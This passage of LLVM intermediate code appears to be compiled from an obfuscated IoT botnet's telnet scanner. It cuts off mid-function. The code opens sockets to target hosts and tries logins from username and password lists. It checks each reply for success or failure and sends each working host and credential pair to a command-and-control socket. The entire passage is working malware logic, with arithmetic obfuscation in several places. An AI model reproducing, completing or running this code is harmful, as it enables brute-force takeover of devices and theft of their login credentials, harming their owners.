  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 1
  %198 = load i32, i32* %197, align 4
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %200 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %199, i32 0, i32 0
  store i32 %198, i32* %200, align 4
  %201 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 0
  store i32 %201, i32* %205, align 16
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 0
  %210 = load i32, i32* %209, align 16
  %211 = icmp eq i32 %210, -1
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %188
  br label %911

; <label>:213:                                    ; preds = %188
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 16
  %224 = call i32 (i32, i32, ...) @fcntl(i32 %223, i32 3, i8* null)
  %225 = xor i32 %224, -1
  %226 = xor i32 2048, -1
  %227 = xor i32 -680675272, -1
  %228 = and i32 %225, -680675272
  %229 = and i32 %224, %227
  %230 = and i32 %226, -680675272
  %231 = and i32 2048, %227
  %232 = or i32 %228, %229
  %233 = or i32 %230, %231
  %234 = xor i32 %232, %233
  %235 = or i32 %225, %226
  %236 = xor i32 %235, -1
  %237 = or i32 -680675272, %227
  %238 = and i32 %236, %237
  %239 = or i32 %234, %238
  %240 = or i32 %224, 2048
  %241 = call i32 (i32, i32, ...) @fcntl(i32 %218, i32 4, i32 %239)
  %242 = load i32, i32* %5, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 16
  %247 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %248 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %248, %struct.sockaddr** %247, align 8
  %249 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %250 = load %struct.sockaddr*, %struct.sockaddr** %249, align 8
  %251 = call i32 @connect(i32 %246, %struct.sockaddr* %250, i32 16)
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %253, label %261

; <label>:253:                                    ; preds = %213
  %254 = call i32* @__errno_location() #13
  %255 = load i32, i32* %254, align 4
  %256 = icmp ne i32 %255, 115
  br i1 %256, label %257, label %261

; <label>:257:                                    ; preds = %253
  %258 = load i32, i32* %5, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %259
  call void @reset_telstate(%struct.telstate_t* %260)
  br label %265

; <label>:261:                                    ; preds = %253, %213
  %262 = load i32, i32* %5, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %263
  call void @advance_telstate(%struct.telstate_t* %264, i32 1)
  br label %265

; <label>:265:                                    ; preds = %261, %257
  br label %910

; <label>:266:                                    ; preds = %100
  br label %267

; <label>:267:                                    ; preds = %266
  %268 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %269 = getelementptr inbounds [16 x i64], [16 x i64]* %268, i64 0, i64 0
  %270 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %269) #2, !srcloc !6
  %271 = extractvalue { i64, i64* } %270, 0
  %272 = extractvalue { i64, i64* } %270, 1
  %273 = trunc i64 %271 to i32
  store i32 %273, i32* %22, align 4
  %274 = ptrtoint i64* %272 to i64
  %275 = trunc i64 %274 to i32
  store i32 %275, i32* %23, align 4
  br label %276

; <label>:276:                                    ; preds = %267
  br label %277

; <label>:277:                                    ; preds = %276
  %278 = load i32, i32* %5, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 0
  %282 = load i32, i32* %281, align 16
  %283 = srem i32 %282, 64
  %284 = zext i32 %283 to i64
  %285 = shl i64 1, %284
  %286 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %287 = load i32, i32* %5, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 0
  %291 = load i32, i32* %290, align 16
  %292 = sdiv i32 %291, 64
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds [16 x i64], [16 x i64]* %286, i64 0, i64 %293
  %295 = load i64, i64* %294, align 8
  %296 = and i64 %295, %285
  %297 = xor i64 %295, %285
  %298 = or i64 %296, %297
  %299 = or i64 %295, %285
  store i64 %298, i64* %294, align 8
  %300 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %300, align 8
  %301 = load i32, i32* %3, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %302, i64* %303, align 8
  %304 = load i32, i32* %5, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %305
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %306, i32 0, i32 0
  %308 = load i32, i32* %307, align 16
  %309 = add i32 %308, -666767837
  %310 = add i32 %309, 1
  %311 = sub i32 %310, -666767837
  %312 = add nsw i32 %308, 1
  %313 = call i32 @select(i32 %311, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %313, i32* %6, align 4
  %314 = load i32, i32* %6, align 4
  %315 = icmp eq i32 %314, 1
  br i1 %315, label %316, label %351

; <label>:316:                                    ; preds = %277
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %317 = load i32, i32* %5, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 0
  %321 = load i32, i32* %320, align 16
  %322 = bitcast i32* %15 to i8*
  %323 = call i32 @getsockopt(i32 %321, i32 1, i32 4, i8* %322, i32* %14) #2
  %324 = load i32, i32* %15, align 4
  %325 = icmp ne i32 %324, 0
  br i1 %325, label %326, label %330

; <label>:326:                                    ; preds = %316
  %327 = load i32, i32* %5, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %328
  call void @reset_telstate(%struct.telstate_t* %329)
  br label %350

; <label>:330:                                    ; preds = %316
  %331 = load i32, i32* %5, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = load i32, i32* %5, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %337
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %338, i32 0, i32 0
  %340 = load i32, i32* %339, align 16
  %341 = call i32 (i32, i32, ...) @fcntl(i32 %340, i32 3, i8* null)
  %342 = xor i32 -2049, -1
  %343 = xor i32 %341, %342
  %344 = and i32 %343, %341
  %345 = and i32 %341, -2049
  %346 = call i32 (i32, i32, ...) @fcntl(i32 %335, i32 4, i32 %344)
  %347 = load i32, i32* %5, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %348
  call void @advance_telstate(%struct.telstate_t* %349, i32 2)
  br label %350

; <label>:350:                                    ; preds = %330, %326
  br label %911

; <label>:351:                                    ; preds = %277
  %352 = load i32, i32* %6, align 4
  %353 = icmp eq i32 %352, -1
  br i1 %353, label %354, label %358

; <label>:354:                                    ; preds = %351
  %355 = load i32, i32* %5, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %356
  call void @reset_telstate(%struct.telstate_t* %357)
  br label %911

; <label>:358:                                    ; preds = %351
  br label %359

; <label>:359:                                    ; preds = %358
  %360 = load i32, i32* %5, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 7
  %364 = load i32, i32* %363, align 16
  %365 = sub i32 %364, 570930130
  %366 = add i32 %365, 5
  %367 = add i32 %366, 570930130
  %368 = add i32 %364, 5
  %369 = zext i32 %367 to i64
  %370 = call i64 @time(i64* null) #2
  %371 = icmp slt i64 %369, %370
  br i1 %371, label %372, label %376

; <label>:372:                                    ; preds = %359
  %373 = load i32, i32* %5, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %374
  call void @reset_telstate(%struct.telstate_t* %375)
  br label %376

; <label>:376:                                    ; preds = %372, %359
  br label %910

; <label>:377:                                    ; preds = %100
  %378 = load i32, i32* %5, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %379
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %380, i32 0, i32 0
  %382 = load i32, i32* %381, align 16
  %383 = load i32, i32* %3, align 4
  %384 = load i32, i32* %5, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %385
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %386, i32 0, i32 9
  %388 = load i8*, i8** %387, align 8
  %389 = call i32 @read_until_response(i32 %382, i32 %383, i8* %388, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %390 = icmp ne i32 %389, 0
  br i1 %390, label %391, label %408

; <label>:391:                                    ; preds = %377
  %392 = load i32, i32* %5, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 9
  %396 = load i8*, i8** %395, align 8
  %397 = call i32 @contains_fail(i8* %396)
  %398 = icmp ne i32 %397, 0
  br i1 %398, label %399, label %403

; <label>:399:                                    ; preds = %391
  %400 = load i32, i32* %5, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %401
  call void @advance_telstate(%struct.telstate_t* %402, i32 0)
  br label %407

; <label>:403:                                    ; preds = %391
  %404 = load i32, i32* %5, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %405
  call void @advance_telstate(%struct.telstate_t* %406, i32 3)
  br label %407

; <label>:407:                                    ; preds = %403, %399
  br label %911

; <label>:408:                                    ; preds = %377
  %409 = load i32, i32* %5, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 7
  %413 = load i32, i32* %412, align 16
  %414 = sub i32 %413, -596560357
  %415 = add i32 %414, 7
  %416 = add i32 %415, -596560357
  %417 = add i32 %413, 7
  %418 = zext i32 %416 to i64
  %419 = call i64 @time(i64* null) #2
  %420 = icmp slt i64 %418, %419
  br i1 %420, label %421, label %425

; <label>:421:                                    ; preds = %408
  %422 = load i32, i32* %5, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %423
  call void @reset_telstate(%struct.telstate_t* %424)
  br label %425

; <label>:425:                                    ; preds = %421, %408
  br label %910

; <label>:426:                                    ; preds = %100
  %427 = load i32, i32* %5, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 0
  %431 = load i32, i32* %430, align 16
  %432 = load i32, i32* %5, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 4
  %436 = load i8, i8* %435, align 2
  %437 = zext i8 %436 to i64
  %438 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %437
  %439 = load i8*, i8** %438, align 8
  %440 = load i32, i32* %5, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 4
  %444 = load i8, i8* %443, align 2
  %445 = zext i8 %444 to i64
  %446 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %445
  %447 = load i8*, i8** %446, align 8
  %448 = call i64 @strlen(i8* %447) #10
  %449 = call i64 @send(i32 %431, i8* %439, i64 %448, i32 16384)
  %450 = icmp slt i64 %449, 0
  br i1 %450, label %451, label %455

; <label>:451:                                    ; preds = %426
  %452 = load i32, i32* %5, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %453
  call void @reset_telstate(%struct.telstate_t* %454)
  br label %911

; <label>:455:                                    ; preds = %426
  %456 = load i32, i32* %5, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 0
  %460 = load i32, i32* %459, align 16
  %461 = call i64 @send(i32 %460, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %462 = icmp slt i64 %461, 0
  br i1 %462, label %463, label %467

; <label>:463:                                    ; preds = %455
  %464 = load i32, i32* %5, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %465
  call void @reset_telstate(%struct.telstate_t* %466)
  br label %911

; <label>:467:                                    ; preds = %455
  %468 = load i32, i32* %5, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %469
  call void @advance_telstate(%struct.telstate_t* %470, i32 4)
  br label %910

; <label>:471:                                    ; preds = %100
  %472 = load i32, i32* %5, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 0
  %476 = load i32, i32* %475, align 16
  %477 = load i32, i32* %3, align 4
  %478 = load i32, i32* %5, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 9
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @read_until_response(i32 %476, i32 %477, i8* %482, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %484 = icmp ne i32 %483, 0
  br i1 %484, label %485, label %502

; <label>:485:                                    ; preds = %471
  %486 = load i32, i32* %5, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 9
  %490 = load i8*, i8** %489, align 8
  %491 = call i32 @contains_fail(i8* %490)
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %493, label %497

; <label>:493:                                    ; preds = %485
  %494 = load i32, i32* %5, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %495
  call void @advance_telstate(%struct.telstate_t* %496, i32 0)
  br label %501

; <label>:497:                                    ; preds = %485
  %498 = load i32, i32* %5, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %499
  call void @advance_telstate(%struct.telstate_t* %500, i32 5)
  br label %501

; <label>:501:                                    ; preds = %497, %493
  br label %911

; <label>:502:                                    ; preds = %471
  %503 = load i32, i32* %5, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 7
  %507 = load i32, i32* %506, align 16
  %508 = add i32 %507, 1967724330
  %509 = add i32 %508, 3
  %510 = sub i32 %509, 1967724330
  %511 = add i32 %507, 3
  %512 = zext i32 %510 to i64
  %513 = call i64 @time(i64* null) #2
  %514 = icmp slt i64 %512, %513
  br i1 %514, label %515, label %519

; <label>:515:                                    ; preds = %502
  %516 = load i32, i32* %5, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %517
  call void @reset_telstate(%struct.telstate_t* %518)
  br label %519

; <label>:519:                                    ; preds = %515, %502
  br label %910

; <label>:520:                                    ; preds = %100
  %521 = load i32, i32* %5, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 0
  %525 = load i32, i32* %524, align 16
  %526 = load i32, i32* %5, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 5
  %530 = load i8, i8* %529, align 1
  %531 = zext i8 %530 to i64
  %532 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %531
  %533 = load i8*, i8** %532, align 8
  %534 = load i32, i32* %5, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %535
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %536, i32 0, i32 5
  %538 = load i8, i8* %537, align 1
  %539 = zext i8 %538 to i64
  %540 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %539
  %541 = load i8*, i8** %540, align 8
  %542 = call i64 @strlen(i8* %541) #10
  %543 = call i64 @send(i32 %525, i8* %533, i64 %542, i32 16384)
  %544 = icmp slt i64 %543, 0
  br i1 %544, label %545, label %549

; <label>:545:                                    ; preds = %520
  %546 = load i32, i32* %5, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %547
  call void @reset_telstate(%struct.telstate_t* %548)
  br label %911

; <label>:549:                                    ; preds = %520
  %550 = load i32, i32* %5, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 0
  %554 = load i32, i32* %553, align 16
  %555 = call i64 @send(i32 %554, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %556 = icmp slt i64 %555, 0
  br i1 %556, label %557, label %561

; <label>:557:                                    ; preds = %549
  %558 = load i32, i32* %5, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %559
  call void @reset_telstate(%struct.telstate_t* %560)
  br label %911

; <label>:561:                                    ; preds = %549
  %562 = load i32, i32* %5, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %563
  call void @advance_telstate(%struct.telstate_t* %564, i32 6)
  br label %910

; <label>:565:                                    ; preds = %100
  %566 = load i32, i32* %5, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 0
  %570 = load i32, i32* %569, align 16
  %571 = load i32, i32* %3, align 4
  %572 = load i32, i32* %5, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 9
  %576 = load i8*, i8** %575, align 8
  %577 = call i32 @read_until_response(i32 %570, i32 %571, i8* %576, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %578 = icmp ne i32 %577, 0
  br i1 %578, label %579, label %650

; <label>:579:                                    ; preds = %565
  %580 = call i64 @time(i64* null) #2
  %581 = trunc i64 %580 to i32
  %582 = load i32, i32* %5, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 7
  store i32 %581, i32* %585, align 16
  %586 = load i32, i32* %5, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 9
  %590 = load i8*, i8** %589, align 8
  %591 = call i32 @contains_fail(i8* %590)
  %592 = icmp ne i32 %591, 0
  br i1 %592, label %593, label %597

; <label>:593:                                    ; preds = %579
  %594 = load i32, i32* %5, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %595
  call void @advance_telstate(%struct.telstate_t* %596, i32 0)
  br label %649

; <label>:597:                                    ; preds = %579
  %598 = load i32, i32* %5, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 9
  %602 = load i8*, i8** %601, align 8
  %603 = call i32 @contains_success(i8* %602)
  %604 = icmp ne i32 %603, 0
  br i1 %604, label %605, label %644

; <label>:605:                                    ; preds = %597
  %606 = load i32, i32* %5, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 3
  %610 = load i8, i8* %609, align 1
  %611 = zext i8 %610 to i32
  %612 = icmp eq i32 %611, 2
  br i1 %612, label %613, label %617

; <label>:613:                                    ; preds = %605
  %614 = load i32, i32* %5, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %615
  call void @advance_telstate(%struct.telstate_t* %616, i32 7)
  br label %643

; <label>:617:                                    ; preds = %605
  %618 = load i32, i32* @mainCommSock, align 4
  %619 = load i32, i32* %5, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %620
  %622 = call i8* @get_telstate_host(%struct.telstate_t* %621)
  %623 = load i32, i32* %5, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 4
  %627 = load i8, i8* %626, align 2
  %628 = zext i8 %627 to i64
  %629 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %628
  %630 = load i8*, i8** %629, align 8
  %631 = load i32, i32* %5, align 4
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %632
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %633, i32 0, i32 5
  %635 = load i8, i8* %634, align 1
  %636 = zext i8 %635 to i64
  %637 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %636
  %638 = load i8*, i8** %637, align 8
  %639 = call i32 (i32, i8*, ...) @sockprintf(i32 %618, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.315, i32 0, i32 0), i8* %622, i8* %630, i8* %638)
  %640 = load i32, i32* %5, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %641
  call void @advance_telstate(%struct.telstate_t* %642, i32 7)
  br label %643

; <label>:643:                                    ; preds = %617, %613
  br label %648

; <label>:644:                                    ; preds = %597
  %645 = load i32, i32* %5, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %646
  call void @reset_telstate(%struct.telstate_t* %647)
  br label %648

; <label>:648:                                    ; preds = %644, %643
  br label %649

; <label>:649:                                    ; preds = %648, %593
  br label %911

; <label>:650:                                    ; preds = %565
  %651 = load i32, i32* %5, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %653, i32 0, i32 7
  %655 = load i32, i32* %654, align 16
  %656 = sub i32 0, %655
  %657 = sub i32 0, 7
  %658 = add i32 %656, %657
  %659 = sub i32 0, %658
  %660 = add i32 %655, 7
  %661 = zext i32 %659 to i64
  %662 = call i64 @time(i64* null) #2
  %663 = icmp slt i64 %661, %662
  br i1 %663, label %664, label %668

; <label>:664:                                    ; preds = %650
  %665 = load i32, i32* %5, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %666
  call void @reset_telstate(%struct.telstate_t* %667)
  br label %668

; <label>:668:                                    ; preds = %664, %650
  br label %910

; <label>:669:                                    ; preds = %100
  %670 = call i64 @time(i64* null) #2
  %671 = trunc i64 %670 to i32
  %672 = load i32, i32* %5, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %673
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %674, i32 0, i32 7
  store i32 %671, i32* %675, align 16
  %676 = load i32, i32* %5, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 0
  %680 = load i32, i32* %679, align 16
  %681 = call i64 @send(i32 %680, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.316, i32 0, i32 0), i64 8, i32 16384)
  %682 = icmp slt i64 %681, 0
  br i1 %682, label %683, label %698

; <label>:683:                                    ; preds = %669
  %684 = load i32, i32* %5, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 0
  %688 = load i32, i32* %687, align 16
  %689 = call i32 @sclose(i32 %688)
  %690 = load i32, i32* %5, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %691
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %692, i32 0, i32 2
  store i8 0, i8* %693, align 8
  %694 = load i32, i32* %5, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 3
  store i8 1, i8* %697, align 1
  br label %911

; <label>:698:                                    ; preds = %669
  %699 = load i32, i32* %5, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %700
